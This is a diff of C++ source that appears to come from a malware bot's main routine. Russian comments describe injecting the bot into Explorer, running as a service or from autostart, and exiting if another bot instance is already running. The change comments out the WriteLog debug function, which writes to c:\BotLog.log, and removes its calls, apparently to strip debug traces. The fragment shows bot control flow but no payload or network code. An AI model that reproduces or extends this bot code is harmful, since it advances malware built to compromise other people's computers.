@@ -40,7 +40,7 @@ namespace MAINDBGTEMPLATES
 
 
 
-char* LogName = "c:\\BotLog.log";
+/*char* LogName = "c:\\BotLog.log";
 
 void WriteLog(const char* Msg)
 {
@@ -55,6 +55,7 @@ void WriteLog(const char* Msg)
 //	pWriteFile(H, "\r\n", 2, &W, NULL);
 	pCloseHandle(H);
 }
+*/
 
 
 
@@ -271,12 +272,10 @@ int APIENTRY MyMain()
 	if (BOT::IsService())
 	{
 		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
-		WriteLog("Запущен сервис");
 		BOT::SetBotType(BotService);
 
 		if (!BOT::IsRunning())
 		{
-			WriteLog("Сервис запускает бота");
 			//JmpToExplorer(ExplorerRoutine);
 		}
 
@@ -286,17 +285,12 @@ int APIENTRY MyMain()
 
 	BOT::SetBotType(BotRing3);
 
-	WriteLog("Стартует бот");
-	WriteLog(Bot->ApplicationName().t_str());
-
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
 	{
-		WriteLog("Бот уже запущен");
 		pExitProcess(0);
 	}
 
-	WriteLog("Запускается бот из автозагрузки");
 
 	DWORD* pVirtualAddr = (DWORD*)MagicValue;
 
